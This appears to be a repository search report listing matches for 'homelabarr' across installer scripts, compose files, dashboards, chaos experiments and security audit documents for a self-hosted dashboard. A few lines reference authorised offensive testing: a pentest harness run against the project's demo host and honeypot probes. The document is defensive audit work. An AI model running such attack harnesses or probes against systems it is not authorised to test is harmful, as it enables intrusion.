| `wiki/site/sitemap.xml` | 16 | `         <loc>https://wiki.homelabarr.com/guides/architecture/</loc>` |
| `wiki/site/sitemap.xml` | 20 | `         <loc>https://wiki.homelabarr.com/guides/cli-bridge/</loc>` |
| `wiki/site/sitemap.xml` | 24 | `         <loc>https://wiki.homelabarr.com/guides/cli-installation/</loc>` |
| `wiki/site/sitemap.xml` | 28 | `         <loc>https://wiki.homelabarr.com/guides/configuration/</loc>` |
| `wiki/site/sitemap.xml` | 32 | `         <loc>https://wiki.homelabarr.com/guides/contributing/</loc>` |
| `wiki/site/sitemap.xml` | 36 | `         <loc>https://wiki.homelabarr.com/guides/faq/</loc>` |
| `wiki/site/sitemap.xml` | 40 | `         <loc>https://wiki.homelabarr.com/guides/history/</loc>` |
| `wiki/site/sitemap.xml` | 44 | `         <loc>https://wiki.homelabarr.com/guides/migration/</loc>` |
| `wiki/site/sitemap.xml` | 48 | `         <loc>https://wiki.homelabarr.com/guides/mobile-app/</loc>` |
| `wiki/site/sitemap.xml` | 52 | `         <loc>https://wiki.homelabarr.com/guides/quick-start/</loc>` |
| `wiki/site/sitemap.xml` | 56 | `         <loc>https://wiki.homelabarr.com/guides/traefik-setup/</loc>` |
| `wiki/site/sitemap.xml` | 60 | `         <loc>https://wiki.homelabarr.com/guides/web-dashboard/</loc>` |
| `wiki/site/sitemap.xml` | 64 | `         <loc>https://wiki.homelabarr.com/guides/white-label/</loc>` |
| `wiki/site/sitemap.xml` | 68 | `         <loc>https://wiki.homelabarr.com/install/changelog/</loc>` |

## Other

**876 references**

| File | Line | Match |
| ---- | ---- | ----- |
| `.github/CODEOWNERS` | 1 | `*  @smashingtags` |
| `.github/FUNDING.yml` | 1 | `ko_fi: homelabarr` |
| `.github/ISSUE_TEMPLATE/bug_report.md` | 6 | `assignees: 'smashingtags'` |
| `.github/dependabot.yml` | 13 | `      - "smashingtags"` |
| `.github/dependabot.yml` | 33 | `      - "smashingtags"` |
| `.github/dependabot.yml` | 49 | `      - "smashingtags"` |
| `.gitleaks.toml` | 1 | `title = "homelabarr-ce gitleaks config"` |
| `.gitleaks.toml` | 7 | `id = "homelabarr-jwt-secret"` |
| `.gitleaks.toml` | 13 | `id = "homelabarr-admin-password"` |
| `.installer/homelabber` | 5 | `# Visit homelabarr.com               #` |
| `.installer/homelabber` | 13 | `homelabarr=/opt/homelabarr` |
| `.installer/homelabber` | 15 | `if [[ -d ${homelabarr} ]];then` |
| `.installer/homelabber` | 17 | `   $(command -v cd) ${homelabarr} && $(command -v bash) install.sh` |
| `.installer/homelabber` | 24 | `homelabarr=/opt/homelabarr` |
| `.installer/homelabber` | 31 | `     $(command -v rsync) ${homelabarr}/homelabarr-ce/docker.yml $basefolder/$compose -aqhv` |
| `.installer/homelabber` | 38 | `     $(command -v chown) -cR 1000:1000 ${homelabarr} 1>/dev/null 2>&1` |
| `.installer/homelabber` | 48 | `  cd /opt/homelabarr/` |
| `.installer/homelabber` | 50 | `  appfolder="/opt/homelabarr"` |
| `.installer/homelabber` | 52 | `  find /opt/homelabarr-cli/apps/ -type f -name '*${APP}*' -exec cp "{}" $basefolder/$compose \;` |
| `.installer/homelabber` | 84 | `homelabarr="/opt/homelabarr-cli"` |
| `.installer/homelabber` | 85 | `envmigrate="$homelabarr/apps/.subactions/envmigrate.sh"` |
| `.installer/ubuntu.sh` | 5 | `# Docker Maintainer smashingtags    #` |
| `.installer/ubuntu.sh` | 23 | `file=/opt/homelabarr/.installer/homelabber` |
| `.installer/ubuntu.sh` | 24 | `store=/bin/homelabarr-cli` |
| `.installer/ubuntu.sh` | 25 | `store2=/usr/bin/homelabarr-cli` |
| `.installer/ubuntu.sh` | 26 | `if [[ -f "/bin/homelabarr-cli" ]];then` |
| `.installer/ubuntu.sh` | 37 | `   # Support both traditional /opt/homelabarr and current directory` |
| `.installer/ubuntu.sh` | 38 | `   if [[ -d "/opt/homelabarr/${LOCATION}" ]]; then` |
| `.installer/ubuntu.sh` | 39 | `      cd /opt/homelabarr/${LOCATION} && $(command -v bash) install.sh` |
| `.zap/scan-config.yml` | 3 | `  name: homelabarr-ce` |
| `.zap/scan-config.yml` | 5 | `    - https://ce-demo.homelabarr.com` |
| `.zap/scan-config.yml` | 8 | `    - https://ce-demo.homelabarr.com/.*` |
| `.zap/scan-config.yml` | 11 | `    - https://ce-demo.homelabarr.com/assets/.*` |
| `.zap/scan-config.yml` | 12 | `    - https://ce-demo.homelabarr.com/fonts/.*` |
| `.zap/scan-config.yml` | 13 | `    - https://ce-demo.homelabarr.com/icons/.*` |
| `.zap/scan-config.yml` | 14 | `    - https://ce-demo.homelabarr.com/favicon\.svg` |
| `.zap/scan-config.yml` | 15 | `    - https://ce-demo.homelabarr.com/robots\.txt` |
| `.zap/scan-config.yml` | 16 | `    - https://ce-demo.homelabarr.com/sitemap\.xml` |
| `.zap/scan-config.yml` | 17 | `    - https://ce-demo.homelabarr.com/\.well-known/.*` |
| `.zap/scan-config.yml` | 21 | `    loginUrl: https://ce-demo.homelabarr.com/api/auth/login` |
| `Makefile` | 9 | `encrypt-db:      ; docker compose exec backend bash scripts/encrypt-db.sh /app/data/homelabarr.db /run/secrets/sqlcipher` |
| `apps/.installer/ubuntu.sh` | 6 | `# Docker owned homelabarr           #` |
| `apps/.installer/ubuntu.sh` | 7 | `# Docker Maintainer homelabarr      #` |
| `apps/.installer/ubuntu.sh` | 71 | `buildshow=$(ls -1p /opt/homelabarr/apps/ \| grep '/$' \| $(command -v sed) 's/\/$//')` |
| `apps/.installer/ubuntu.sh` | 86 | `     checksection=$(ls -1p /opt/homelabarr/apps/ \| grep '/$' \| $(command -v sed) 's/\/$//' \| grep -x $section)` |
| `apps/.installer/ubuntu.sh` | 93 | `buildshow=$(ls -1p /opt/homelabarr/apps/${section}/ \| sed -e 's/.yml//g' )` |
| `apps/.installer/ubuntu.sh` | 108 | `     buildapp=$(ls -1p /opt/homelabarr/apps/${section}/ \| $(command -v sed) -e 's/.yml//g' \| grep -x $typed)` |
| `apps/.installer/ubuntu.sh` | 191 | `  --exclude-from=/opt/homelabarr/apps/.backup/backup_excludes \` |
| `apps/.installer/ubuntu.sh` | 212 | `   appfolder=/opt/homelabarr/apps/` |
| `apps/.installer/ubuntu.sh` | 238 | `  --exclude-from=/opt/homelabarr/apps/.backup/backup_excludes \` |
| `apps/.installer/ubuntu.sh` | 259 | `   appfolder=/opt/homelabarr/apps/` |
| `apps/.installer/ubuntu.sh` | 386 | `   appfolder=/opt/homelabarr/apps/` |
| `apps/.installer/ubuntu.sh` | 408 | `  appfolder="/opt/homelabarr/apps"` |
| `apps/.installer/ubuntu.sh` | 724 | `appfolder="/opt/homelabarr/apps"` |
| `apps/downloads/nzbget.yml` | 11 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:nzbget\|ghcr.io/imogenlabs/homelabarr-mod-nzbget:v1.0.0"` |
| `apps/downloads/qbittorrent.yml` | 12 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:qbittorrent\|ghcr.io/imogenlabs/homelabarr-mod-qbittorrent:v1.0.0"` |
| `apps/downloads/sabnzbd.yml` | 11 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:sabnzbd\|ghcr.io/imogenlabs/homelabarr-mod-sabnzbd:v1.0.0"` |
| `apps/media-management/bazarr.yml` | 11 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:bazarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/lidarr.yml` | 11 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:lidarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/radarr.yml` | 11 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:radarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/readarr.yml` | 11 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:readarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/sonarr.yml` | 11 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:sonarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/tautulli.yml` | 11 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:tautulli\|ghcr.io/imogenlabs/homelabarr-mod-tautulli:v1.0.0"` |
| `apps/media-servers/emby.yml` | 17 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:emby\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-servers/jellyfin.yml` | 11 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:jellyfin\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-servers/plex-gluetun.yml` | 13 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:plex\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-servers/plex.yml` | 14 | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:plex\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/monitoring/dashboards/cadvisor-dashboard.json` | 917 | `    "homelabarr",` |
| `apps/monitoring/dashboards/coder-platform-dashboard.json` | 1289 | `    "homelabarr"` |
| `apps/monitoring/dashboards/dozzle-logs-dashboard.json` | 556 | `    "homelabarr",` |
| `apps/monitoring/dashboards/dozzle-logs-dashboard.json` | 571 | `  "uid": "homelabarr-dozzle",` |
| `apps/monitoring/dashboards/homelabarr-overview.json` | 556 | `    "homelabarr",` |
| `apps/monitoring/dashboards/homelabarr-overview.json` | 570 | `  "uid": "homelabarr-overview",` |
| `apps/monitoring/dashboards/jellyfin-dashboard.json` | 850 | `    "homelabarr",` |
| `apps/monitoring/dashboards/media-server-dashboard.json` | 704 | `    "homelabarr",` |
| `apps/monitoring/dashboards/media-server-dashboard.json` | 718 | `  "uid": "homelabarr-media",` |
| `apps/monitoring/dashboards/node-exporter-dashboard.json` | 1115 | `    "homelabarr",` |
| `apps/monitoring/dashboards/nzbget-dashboard.json` | 774 | `    "homelabarr",` |
| `apps/monitoring/dashboards/promtail-dashboard.json` | 1027 | `    "homelabarr",` |
| `apps/monitoring/dashboards/qbittorrent-dashboard.json` | 944 | `    "homelabarr",` |
| `apps/monitoring/dashboards/radarr-dashboard.json` | 856 | `    "homelabarr",` |
| `apps/monitoring/dashboards/sonarr-dashboard.json` | 856 | `    "homelabarr",` |
| `apps/monitoring/dashboards/traefik-authelia-dashboard.json` | 682 | `    "homelabarr",` |
| `apps/monitoring/dashboards/traefik-authelia-dashboard.json` | 697 | `  "uid": "homelabarr-traefik",` |
| `apps/monitoring/prometheus.yml` | 6 | `    cluster: 'homelabarr-cli'` |
| `apps/monitoring/prometheus.yml` | 127 | `  - job_name: 'homelabarr-exporters'` |
| `apps/monitoring/promtail-config.yml` | 21 | `          host: homelabarr-cli` |
| `apps/monitoring/provisioning/dashboards/dashboard.yml` | 4 | `  - name: 'homelabarr-dashboards'` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 106 | `            "tags": ["homelabarr", "auto-generated", app_type, name],` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 112 | `            "uid": f"homelabarr-{name}",` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 428 | `        homelabarr_containers = [` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 434 | `        print(f"📊 Found {len(homelabarr_containers)} HomelabARR CLI applications")` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 437 | `        for container in homelabarr_containers:` |
| `apps/system/cf-companion.yml` | 4 | `    image: "smashingtags/cf-companion:latest"` |
| `apps/system/cf-companion.yml` | 19 | `      - "com.homelabarr.name=CF Companion"` |
| `apps/system/cf-companion.yml` | 20 | `      - "com.homelabarr.description=Auto-create Cloudflare DNS records for containers with Traefik labels"` |
| `apps/system/cf-companion.yml` | 21 | `      - "com.homelabarr.category=addons"` |
| `apps/system/cf-companion.yml` | 22 | `      - "com.homelabarr.url=https://github.com/imogenlabs/cf-companion"` |
| `apps/system/cf-companion.yml` | 23 | `      - "com.homelabarr.icon=cloudflare"` |
| `chaos/experiments/01-pod-kill-backend.md` | 8 | `docker kill homelabarr-demo-backend` |
| `chaos/experiments/01-pod-kill-backend.md` | 20 | `1. 'curl -s https://ce-demo.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/01-pod-kill-backend.md` | 22 | `3. Honey probe 'curl -s https://ce-demo.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/02-disk-pressure.md` | 20 | `1. 'curl -s https://ce-demo.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/02-disk-pressure.md` | 22 | `3. Honey probe 'curl -s https://ce-demo.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/03-network-partition.md` | 20 | `1. 'curl -s https://ce-demo.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/03-network-partition.md` | 22 | `3. Honey probe 'curl -s https://ce-demo.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/04-memory-exhaustion.md` | 20 | `1. 'curl -s https://ce-demo.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/04-memory-exhaustion.md` | 22 | `3. Honey probe 'curl -s https://ce-demo.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/05-time-skew.md` | 20 | `1. 'curl -s https://ce-demo.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/05-time-skew.md` | 22 | `3. Honey probe 'curl -s https://ce-demo.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/06-rapid-restart.md` | 20 | `1. 'curl -s https://ce-demo.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/06-rapid-restart.md` | 22 | `3. Honey probe 'curl -s https://ce-demo.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/07-cold-cache-burst.md` | 20 | `1. 'curl -s https://ce-demo.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/07-cold-cache-burst.md` | 22 | `3. Honey probe 'curl -s https://ce-demo.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/08-crash-log-scan.md` | 8 | `docker logs homelabarr-demo-backend --since 5m 2>&1 \| \` |
| `compliance/cis-docker-v1.6.0.md` | 9 | `Dockerfile.backend: 'USER homelabarr' (uid 1001). Dockerfile frontend: 'USER homelabarr' (uid 1001).` |
| `compliance/cis-docker-v1.6.0.md` | 46 | `'security_opt: apparmor=homelabarr-backend' in compose. Profile installed via 'scripts/install-apparmor.sh'.` |
| `compliance/cis-docker-v1.6.0.md` | 63 | `All services on custom bridge networks ('homelabarr', 'homelabarr-internal'). None on 'host' mode.` |
| `compliance/collect-evidence.sh` | 10 | `HOST="${EVIDENCE_HOST:-ce-demo.homelabarr.com}"` |
| `compliance/collect-evidence.sh` | 11 | `BACKEND="${EVIDENCE_BACKEND:-homelabarr-demo-backend}"` |
| `compliance/collect-evidence.sh` | 112 | `        --certificate-identity-regexp 'smashingtags' \` |
| `compliance/owasp-asvs-v4.0.3-L2.md` | 72 | `\| V8.3.1 \| Sensitive data encrypted at rest \| [Met] \| SQLCipher AES-256 on homelabarr.db (R7) \|` |
| `compliance/posture.md` | 38 | `\| R4 \| Container hardening \| homelabarr.yml, Dockerfile.backend, socket-proxy \|` |
| `compliance/render-attestation.cjs` | 39 | `const backendImage = run('docker inspect homelabarr-demo-backend --format "{{.Config.Image}}" 2>/dev/null');` |
| `compliance/render-attestation.cjs` | 40 | `const frontendImage = run('docker inspect homelabarr-demo-frontend --format "{{.Config.Image}}" 2>/dev/null');` |
| `compliance/render-attestation.cjs` | 45 | `  cosignBackend = run('cosign verify --certificate-identity-regexp smashingtags --certificate-oidc-issuer https://token.` |
| `compliance/render-attestation.cjs` | 48 | `  cosignFrontend = run('cosign verify --certificate-identity-regexp smashingtags --certificate-oidc-issuer https://token` |
| `docs/INCIDENT-RESPONSE.md` | 20 | `docker cp homelabarr-backend:/app/data ./forensics-$(date +%s)/` |
| `docs/audit/R10-pentest-adversary-emulation.md` | 4 | `**Target:** homelabarr-ce (main @ '3a5c75b9967819561edd244b47cbf764eeff5721'), ce-demo.homelabarr.com` |
| `docs/audit/R10-pentest-adversary-emulation.md` | 176 | `BASE=${ART_TARGET:-https://ce-demo.homelabarr.com}` |
| `docs/audit/R10-pentest-adversary-emulation.md` | 210 | `BASE=${ART_TARGET:-https://ce-demo.homelabarr.com}` |
| `docs/audit/R10-pentest-adversary-emulation.md` | 332 | `ART_TARGET=https://ce-demo.homelabarr.com pentest/harness/run.sh --class A1` |
| `docs/audit/R10.5-carry-forward-correction.md` | 69 | `        default: 'https://ce-demo.homelabarr.com'` |
| `docs/audit/R10.5-carry-forward-correction.md` | 89 | `          ART_TARGET: ${{ github.event.inputs.target \|\| 'https://ce-demo.homelabarr.com' }}` |
| `docs/audit/R10.5-carry-forward-correction.md` | 286 | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R10.6-honey-events-not-emitting.md` | 213 | `BASE=${ART_TARGET:-https://ce-demo.homelabarr.com}` |
| `docs/audit/R10.6-honey-events-not-emitting.md` | 238 | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R10.7-remove-nginx-honey-interception.md` | 142 | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R11-compliance-posture.md` | 4 | `**Target:** homelabarr-ce main @ '5db8b66ff6', ce-demo.homelabarr.com` |
| `docs/audit/R11-compliance-posture.md` | 66 | `PCI-DSS, HIPAA, SOC 2 are explicitly OUT OF SCOPE — this is an open-source self-hosted dashboard, not a regulated envi` |
| `docs/audit/R11-compliance-posture.md` | 130 | `# CIS Docker Benchmark v1.6.0 — homelabarr-ce posture` |
| `docs/audit/R11-compliance-posture.md` | 179 | `Evidence: 'docker inspect <c> \| jq '.[0].AppArmorProfile'' → 'homelabarr-backend'` |
| `docs/audit/R11-compliance-posture.md` | 197 | `Evidence: 'docker inspect <c> \| jq '.[0].HostConfig.NetworkMode'' → 'homelabarr_net', not 'host'.` |
| `docs/audit/R11-compliance-posture.md` | 330 | `# NIST CSF 2.0 — homelabarr-ce alignment` |
| `docs/audit/R11-compliance-posture.md` | 395 | `HOST=ce-demo.homelabarr.com` |
| `docs/audit/R11-compliance-posture.md` | 452 | `  cosign verify --certificate-identity-regexp 'smashingtags' --certificate-oidc-issuer https://token.actions.githubuserc` |
| `docs/audit/R11-compliance-posture.md` | 500 | `# Incident response — homelabarr-ce` |
| `docs/audit/R11-compliance-posture.md` | 534 | `grep -q 'homelabarr-backend' compliance/evidence/CIS-5.1-apparmor.txt` |
| `docs/audit/R11.5-evidence-script-gaps.md` | 35 | `\| collect-evidence.sh missing R5 cosign verify \| R11 §3 H-5 — 'cosign verify --certificate-identity-regexp 'smashin` |
| `docs/audit/R11.5-evidence-script-gaps.md` | 101 | `      --certificate-identity-regexp 'smashingtags' \` |
| `docs/audit/R12-chaos-engineering.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ main '1170de586a' (== dev, R11.5 merged 2026-05-23T01:34:36Z)` |
| `docs/audit/R12-chaos-engineering.md` | 4 | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R13-threat-model-formalization.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ main '762448815a' (== dev, R12 merged 2026-05-23T01:50:35Z)` |
| `docs/audit/R13-threat-model-formalization.md` | 4 | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R13-threat-model-formalization.md` | 19 | `\| 5 \| 'docs/audit/homelabarr-ce-security-audit-round-8.md' extended with "Restore drill log" section \| Section presen` |
| `docs/audit/R14-incident-response-runbook.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ main 'b9e836031e' (== dev, R13 merged 2026-05-23T02:04:53Z)` |
| `docs/audit/R14-incident-response-runbook.md` | 4 | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ main '7fd3a395dd' (== dev, R14 merged 2026-05-23T02:18:35Z)` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 4 | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 160 | `      - "smashingtags"            # owner gets auto-assigned` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 181 | `      - "smashingtags"` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 193 | `      - "smashingtags"` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 265 | `      --certificate-identity-regexp 'https://github.com/imogenlabs/homelabarr-ce/.github/workflows/' \` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 267 | `      ghcr.io/imogenlabs/homelabarr-ce:${{ github.sha }}` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 442 | `\| O-2 \| Confirm reviewer GitHub handle for dependabot.yml. Spec uses 'smashingtags'. \| Identity \| Confirm or add oth` |
| `docs/audit/R16-continuous-evidence-binder-rebuild.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ main 'a1e2c7de8f' (== dev, R15 merged 2026-05-23T02:35:52Z)` |
| `docs/audit/R16-continuous-evidence-binder-rebuild.md` | 4 | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R17-public-disclosure-surface.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ main '7b2954e2c1' (== dev, R16 merged 2026-05-23T02:46:33Z)` |
| `docs/audit/R17-public-disclosure-surface.md` | 4 | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R17-public-disclosure-surface.md` | 98 | `**Acceptance:** 'curl -sI https://ce-demo.homelabarr.com/security.txt' returns 'HTTP/2 301' with 'location: /.well-known` |
| `docs/audit/R17-public-disclosure-surface.md` | 119 | `Sitemap: https://ce-demo.homelabarr.com/sitemap.xml` |
| `docs/audit/R17-public-disclosure-surface.md` | 131 | `**Acceptance:** 'curl -s https://ce-demo.homelabarr.com/robots.txt' returns 200 'text/plain' with the directives above.` |
| `docs/audit/R17-public-disclosure-surface.md` | 146 | `<link rel="canonical" href="https://ce-demo.homelabarr.com/">` |
| `docs/audit/R17-public-disclosure-surface.md` | 153 | `<meta property="og:url" content="https://ce-demo.homelabarr.com/">` |
| `docs/audit/R17-public-disclosure-surface.md` | 161 | `**Acceptance:** 'curl -s https://ce-demo.homelabarr.com/ \| grep -E 'meta name="description"\|meta name="robots"\|rel="c` |
| `docs/audit/R17-public-disclosure-surface.md` | 199 | `**Acceptance:** 'curl -sI https://ce-demo.homelabarr.com/.well-known/change-password' returns 302 (or 301) with a sensib` |
| `docs/audit/R17-public-disclosure-surface.md` | 235 | `LABEL org.opencontainers.image.title="homelabarr-ce-backend"` |
| `docs/audit/R17-public-disclosure-surface.md` | 237 | `LABEL org.opencontainers.image.url="https://ce-demo.homelabarr.com"` |
| `docs/audit/R17-public-disclosure-surface.md` | 238 | `LABEL org.opencontainers.image.source="https://github.com/imogenlabs/homelabarr-ce"` |
| `docs/audit/R17-public-disclosure-surface.md` | 239 | `LABEL org.opencontainers.image.documentation="https://github.com/imogenlabs/homelabarr-ce/blob/main/README.md"` |
| `docs/audit/R17-public-disclosure-surface.md` | 242 | `LABEL io.homelabarr.security.contact="https://github.com/imogenlabs/homelabarr-ce/security/policy"` |
| `docs/audit/R17-public-disclosure-surface.md` | 264 | `Site: https://homelabarr.com` |
| `docs/audit/R17-public-disclosure-surface.md` | 306 | `**Required:** add a small section noting that the canonical disclosure contact is also available at 'https://ce-demo.hom` |
| `docs/audit/R17-public-disclosure-surface.md` | 311 | `- https://ce-demo.homelabarr.com/.well-known/security.txt (RFC 9116)` |
| `docs/audit/R17-public-disclosure-surface.md` | 335 | `curl -sI https://ce-demo.homelabarr.com/security.txt \| grep -E '^HTTP.*30[12]' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 337 | `curl -sI https://ce-demo.homelabarr.com/security.txt \| grep -i 'location:.*\.well-known/security\.txt' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 341 | `curl -s https://ce-demo.homelabarr.com/.well-known/security.txt \| grep -q '^Contact:' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 343 | `curl -s https://ce-demo.homelabarr.com/.well-known/security.txt \| grep -q '^Expires:' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 347 | `curl -s https://ce-demo.homelabarr.com/robots.txt \| grep -q 'User-agent:' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 349 | `curl -s https://ce-demo.homelabarr.com/robots.txt \| grep -q 'Disallow: /api/' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 351 | `curl -sI https://ce-demo.homelabarr.com/robots.txt \| grep -i 'content-type:.*text/plain' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 355 | `HTML=$(curl -s https://ce-demo.homelabarr.com/)` |
| `docs/audit/R17-public-disclosure-surface.md` | 362 | `curl -sI https://ce-demo.homelabarr.com/.well-known/change-password \| grep -E '^HTTP.*30[12]' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 366 | `curl -sI https://ce-demo.homelabarr.com/humans.txt \| grep -E '^HTTP.*(200\|404)' \| head -1 \` |
| `docs/audit/R17-public-disclosure-surface.md` | 377 | `docker pull ghcr.io/imogenlabs/homelabarr-ce:latest 2>/dev/null` |
| `docs/audit/R17-public-disclosure-surface.md` | 378 | `docker inspect ghcr.io/imogenlabs/homelabarr-ce:latest \` |
| `docs/audit/R17.5-redeploy-correction.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ main '139ce79561' (== dev, R17 merged 2026-05-23T02:56:20Z)` |
| `docs/audit/R17.5-redeploy-correction.md` | 4 | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R17.5-redeploy-correction.md` | 36 | `Live origin verification at 'https://ce-demo.homelabarr.com/' with cache-bust + 'credentials: 'omit'':` |
| `docs/audit/R17.5-redeploy-correction.md` | 120 | `curl -sI -o /dev/null -w '%{http_code} %{redirect_url}\n' https://ce-demo.homelabarr.com/security.txt` |
| `docs/audit/R17.5-redeploy-correction.md` | 121 | `# Expect: 301 https://ce-demo.homelabarr.com/.well-known/security.txt` |
| `docs/audit/R17.5-redeploy-correction.md` | 124 | `curl -s https://ce-demo.homelabarr.com/.well-known/security.txt \| grep -q '^Contact:' && echo OK \|\| echo FAIL` |
| `docs/audit/R17.5-redeploy-correction.md` | 127 | `curl -s https://ce-demo.homelabarr.com/robots.txt \| head -1` |
| `docs/audit/R17.5-redeploy-correction.md` | 129 | `curl -sI https://ce-demo.homelabarr.com/robots.txt \| grep -i 'content-type:.*text/plain'` |
| `docs/audit/R17.5-redeploy-correction.md` | 132 | `curl -s https://ce-demo.homelabarr.com/humans.txt \| head -1` |
| `docs/audit/R17.5-redeploy-correction.md` | 136 | `curl -sI -o /dev/null -w '%{http_code} %{redirect_url}\n' https://ce-demo.homelabarr.com/.well-known/change-password` |
| `docs/audit/R17.5-redeploy-correction.md` | 140 | `HTML=$(curl -s https://ce-demo.homelabarr.com/)` |
| `docs/audit/R17.5-redeploy-correction.md` | 148 | `curl -sI https://ce-demo.homelabarr.com/ \| grep -i 'last-modified:'` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 4 | `> **Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 5 | `> **Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 80 | `curl -H "Authorization: Bearer YOUR_TOKEN" https://homelabarr.yourdomain.com/api/auth/api-keys` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 170 | `**Surface:** Live response from ce-demo.homelabarr.com — 'Content-Type: text/plain, text/plain'` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 213 | `**FIX:** Owner-pile item (operations, agent-applicable): cron on ce-prod that compares the live last-modified header aga` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 228 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/wiki/docs/guides/api-reference.md \` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 233 | `curl -sI https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/wiki/docs/guides/security.md \| head -1` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 238 | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/wiki/docs/guides/$f \` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 243 | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/wiki/docs/img/diagrams/generate_diagrams.py \` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 248 | `curl -sI https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/HANDOFF-APP-REBUILD.md \| head -1` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 253 | `curl -sI 'https://ce-demo.homelabarr.com/robots.txt?_=$(date +%s)' \| grep -i 'content-type'` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 257 | `curl -sI 'https://ce-demo.homelabarr.com/__nope_$(date +%s)' \| head -1` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 265 | `- Wiki search / discoverability (does ce-demo or homelabarr.com have a search index? — R19)` |
